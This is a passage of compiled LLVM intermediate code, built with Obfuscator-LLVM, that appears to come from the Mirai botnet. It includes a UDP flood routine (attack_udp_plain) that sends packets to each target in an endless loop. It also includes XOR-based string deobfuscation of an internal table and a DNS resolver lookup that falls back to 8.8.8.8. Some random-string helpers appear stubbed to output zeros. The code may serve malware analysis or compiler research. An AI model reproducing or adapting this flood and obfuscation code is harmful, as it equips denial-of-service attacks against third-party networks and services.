  br i1 %178, label %.lr.ph, label %.loopexit.loopexit

; <label>:179:                                    ; preds = %28, %4, %50
  ret void

; <label>:180:                                    ; preds = %.lr.ph128.1135
  %181 = add i8 %.1, 1
  br label %185

; <label>:182:                                    ; preds = %.lr.ph128.1135
  store i8 %.1, i8* %.1119, align 1
  %183 = getelementptr inbounds i8, i8* %108, i64 %indvars.iv.next
  %184 = getelementptr inbounds i8, i8* %183, i64 1
  br label %185

; <label>:185:                                    ; preds = %182, %180
  %.1119.1 = phi i8* [ %184, %182 ], [ %.1119, %180 ]
  %.1.1 = phi i8 [ 0, %182 ], [ %181, %180 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph128
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 30)
  %3 = tail call i8* @table_retrieve_val(i32 30, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #9
  tail call void @table_lock_val(i8 zeroext 30)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #9
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #9
  tail call void @table_unlock_val(i8 zeroext 31)
  %11 = tail call i8* @table_retrieve_val(i32 31, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #9
  call void @table_lock_val(i8 zeroext 31)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31) #9
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #9
  br label %38

; <label>:35:                                     ; preds = %25, %21, %21, %28
  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @htonl(i32 134744072) #10
  br label %38

; <label>:38:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %37, %.loopexit ]
  ret i32 %.0
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #9
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #10
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %58
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp eq i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %58
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %58 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #9
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #10
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #9
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %31, i32 16) #9
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %50 = load i8, i8* %49, align 4
  %51 = icmp ult i8 %50, 32
  br i1 %51, label %52, label %58

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @ntohl(i32 %54) #10
  %56 = call i32 @htonl(i32 %55) #10
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %56, i32* %57, align 4
  br label %58

; <label>:58:                                     ; preds = %52, %47
  %59 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %43, %struct.sockaddr* %59, i32 16) #9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %62 = icmp eq i8 %16, 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %67, %.lr.ph.preheader
  %.160 = phi i32 [ %.mux, %67 ], [ 0, %.lr.ph.preheader ]
  %63 = sext i32 %.160 to i64
  %64 = getelementptr inbounds i8*, i8** %8, i64 %63
  %65 = load i8*, i8** %64, align 8
  br i1 %62, label %67, label %66

; <label>:66:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %65, i32 %.mask)
  br label %67

; <label>:67:                                     ; preds = %.lr.ph, %66
  %68 = getelementptr inbounds i32, i32* %10, i64 %63
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %65, i64 %34, i32 16384) #9
  %71 = add nsw i32 %.160, 1
  %72 = icmp slt i32 %71, %24
  %.mux = select i1 %72, i32 %71, i32 0
  br label %.lr.ph
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #7 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #8 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #8 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.017 = phi i8* [ %.0.be, %.backedge ], [ %0, %.lr.ph.preheader ]
  %.01316 = phi i32 [ %8, %.backedge ], [ %1, %.lr.ph.preheader ]
  %4 = icmp ugt i32 %.01316, 3
  br i1 %4, label %.preheader.preheader, label %6

.preheader.preheader:                             ; preds = %.lr.ph
  %5 = bitcast i8* %.017 to i32*
  store i32 1633771873, i32* %5, align 1
  %scevgep = getelementptr i8, i8* %.017, i64 4
  br label %.backedge

; <label>:6:                                      ; preds = %.lr.ph
  %7 = getelementptr inbounds i8, i8* %.017, i64 1
  store i8 0, i8* %.017, align 1
  br label %.backedge

.backedge:                                        ; preds = %.preheader.preheader, %6
  %.sink = phi i32 [ -1, %6 ], [ -4, %.preheader.preheader ]
  %.0.be = phi i8* [ %7, %6 ], [ %scevgep, %.preheader.preheader ]
  %8 = add i32 %.01316, %.sink
  %9 = icmp sgt i32 %8, 0
  br i1 %9, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #8 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #8 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #8 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #8 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [81 x %struct.table_value], [81 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146844069}
!2 = !{i32 -2146843660}
